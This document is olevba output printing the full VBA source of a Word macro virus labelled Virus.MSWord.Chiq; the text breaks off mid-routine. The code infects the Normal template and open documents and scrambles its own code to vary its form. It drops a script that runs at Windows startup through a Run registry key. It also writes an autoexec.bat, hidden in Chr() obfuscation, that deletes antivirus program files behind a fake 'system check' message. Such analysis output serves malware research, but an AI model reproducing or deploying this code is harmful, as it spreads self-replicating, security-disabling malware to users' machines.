olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chiq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chiq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

Private Function ZZ(MMM)
Randomize: On Error Resume Next
Blah = "AA BB CC DD EEE ZZ MMM Blah BoB BoBby SDH SDH2 HH NtCode AdCode XX RRR YY "
Do
SDH2 = Left(Blah, InStr(Blah, Chr(32)) - 1): Blah = Mid(Blah, InStr(Blah, Chr(32)) + 1)
YY = Int(Rnd * 7) + 2
BoBby = Chr((Int(Rnd * 25) + 65))
For XX = 1 To YY: BoBby = BoBby + Chr((Int(Rnd * 25) + 65)): Next XX
Do
SDH = InStr(SDH + 1, LCase(MMM), LCase(SDH2))
If SDH Then MMM = Mid(MMM, 1, (SDH - 1)) & BoBby & Mid(MMM, (SDH + Len(SDH2)))
Loop While SDH
Loop While Blah <> ""
ZZ = MMM
End Function

Private Function EEE(HH, XX)
Dim EEE22(99), EEE23(99)
Set ourEEE = ThisDocument.VBProject.VBComponents(1).CodeModule
For i = 1 To HH: curEEE = tmpEEE
tmpEEE = ourEEE.ProcOfLine(i, 1)
If curEEE <> tmpEEE Then y = y + 1
EEE22(y) = EEE22(y) & ourEEE.lines(i, 1) & vbCr
Next i
For x = 1 To XX
EEE22(x) = Left(EEE22(x), Len(EEE22(x)) - 1)
c22 = 0: c23 = 0: c24 = Int(Rnd * (XX - x) + 1)
While c22 < c24
If EEE23(c23 + 1) = "" Then c22 = c22 + 1
c23 = c23 + 1
Wend
EEE23(c23) = x
Next x
For i = 1 To XX
EEE = EEE & EEE22(EEE23(i)) & vbCr
Next i
EEE = Left(EEE, Len(EEE) - 1)
End Function

Private Sub FileSaveAs()
Dim XX As Integer, YY As Integer: Randomize: On Error Resume Next
XX = Int(Rnd * 92) + 30: YY = Int(Rnd * 92) + 30: Dialogs(wdDialogFileSaveAs).Show
End Sub

Private Sub CC()
On Error Resume Next: h$ = Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(46) & Chr(98) & Chr(97) & Chr(116)
Open h$ For Output As #1
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(115) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(32) & Chr(112) & Chr(117) & Chr(116) & Chr(32) & Chr(105) & Chr(110) & Chr(32) & Chr(98) & Chr(121) & Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(44) & Chr(32) & Chr(105) & Chr(102) & Chr(32) & Chr(100) & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(44)
PP$ = Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(32) & Chr(108) & Chr(111) & Chr(110) & Chr(103) & Chr(101) & Chr(114) & Chr(32) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116) & Chr(32) & Chr(117) & Chr(112) & Chr(32) & Chr(45) & Chr(13) & Chr(10) & Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(80) & Chr(108) & Chr(101) & Chr(97) & Chr(115) & Chr(101) & Chr(32) & Chr(68)
QQ$ = Chr(111) & Chr(32) & Chr(78) & Chr(111) & Chr(116) & Chr(32) & Chr(82) & Chr(101) & Chr(109) & Chr(111) & Chr(118) & Chr(101) & Chr(32) & Chr(45)
YY$ = OO$ & PP$ & QQ$: Print #1, YY$
OO$ = Chr(64) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(111) & Chr(102) & Chr(102) & Chr(13) & Chr(10) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(89) & Chr(111) & Chr(117) & Chr(32) & Chr(65) & Chr(110) & Chr(116) & Chr(105) & Chr(45) & Chr(86) & Chr(105) & Chr(114) & Chr(117) & Chr(115) & Chr(32) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(119) & Chr(32)
PP$ = Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(32) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(46) & Chr(46) & Chr(46)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110)
PP$ = Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
SS$ = Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101)
TT$ = Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110)
PP$ = Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(32) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
QQ$ = Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92)
SS$ = Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(13)
TT$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
UU$ = Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109)
PP$ = Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101)
SS$ = Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103)
TT$ = Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100)
UU$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
VV$ = Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49)
PP$ = Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120)
QQ$ = Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97)
SS$ = Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
TT$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92)
UU$ = Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100)
VV$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13)
PP$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(32) & Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(104) & Chr(97) & Chr(115) & Chr(32) & Chr(98) & Chr(101) & Chr(101) & Chr(110) & Chr(32) & Chr(99) & Chr(111) & Chr(109) & Chr(112) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(46)
Print #1, OO$
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
PP$ = Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
YY$ = OO$ & PP$: Print #1, YY$: Close #1
End Sub

Private Sub AA(XX As Integer, TT As Integer)
Randomize: On Error Resume Next
If ActiveDocument.Characters.Count > 0 Then
Selection.MoveStart Unit:=wdCharacter, Count:=1
With Selection.Find: .ClearFormatting: .Text = Chr(XX): .Replacement.ClearFormatting: .Replacement.Text = Chr(TT): .Execute Replace:=wdReplaceAll, Forward:=(555 - 544), Wrap:=wdFindContinue: End With: End If
End Sub

Private Sub BB()
Dim NtCode As Object, AdCode As Object: On Error Resume Next: Randomize
Set NtCode = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set AdCode = ActiveDocument.VBProject.VBComponents(1).CodeModule
If NtCode.lines(54, 1) = "" Then
NtCode.deletelines 1, NtCode.countoflines: EEE AdCode.countoflines, 14
RRR = ZZ(AdCode.lines(1, AdCode.countoflines)): NtCode.insertlines 1, RRR
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
ActiveDocument.Saved = (545 - 544): NormalTemplate.Saved = (545 - 544)
RRR = AdCode.lines(1, AdCode.countoflines)
OO$ = Chr(99) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(92) & Chr(67) & Chr(104) & Chr(105) & Chr(81) & Chr(117) & Chr(105) & Chr(46) & Chr(66) & Chr(97) & Chr(83)
Open OO$ For Output As #1: Print #1, RRR: Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Word2000.ChiQui") = "C:\windows\system\ChiQui.Vbs"
Call DD: End If
If AdCode.lines(54, 1) = "" Then
AdCode.deletelines 1, AdCode.countoflines: EEE NtCode.countoflines, 14
RRR = ZZ(NtCode.lines(1, NtCode.countoflines)): AdCode.insertlines 1, RRR
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save
ActiveDocument.Saved = (545 - 544): NormalTemplate.Saved = (545 - 544)
RRR = NtCode.lines(1, NtCode.countoflines)
OO$ = Chr(99) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(92) & Chr(67) & Chr(104) & Chr(105) & Chr(81) & Chr(117) & Chr(105) & Chr(46) & Chr(66) & Chr(97) & Chr(83)
Open OO$ For Output As #1: Print #1, RRR: Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Word2000.ChiQui") = "C:\windows\system\ChiQui.Vbs"
Call DD: End If
End Sub

Private Sub DD(): On Error Resume Next
L$ = Chr(99) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(92) & Chr(67) & Chr(104) & Chr(105) & Chr(81) & Chr(117) & Chr(105) & Chr(46) & Chr(86) & Chr(98) & Chr(83)
Open "c:\windows\desktop\x.txt" For Output As #1
P1$ = Chr(82) & Chr(97) & Chr(110) & Chr(100) & Chr(111) & Chr(109) & Chr(105) & Chr(122) & Chr(101) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(70) & Chr(83) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(61) & Chr(32) & Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(40) & Chr(34) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(105) & Chr(110) & Chr(103)
p2$ = Chr(46) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(34) & Chr(41) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(32) & Chr(61) & Chr(32) & Chr(70) & Chr(83) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(46) & Chr(79) & Chr(112) & Chr(101)
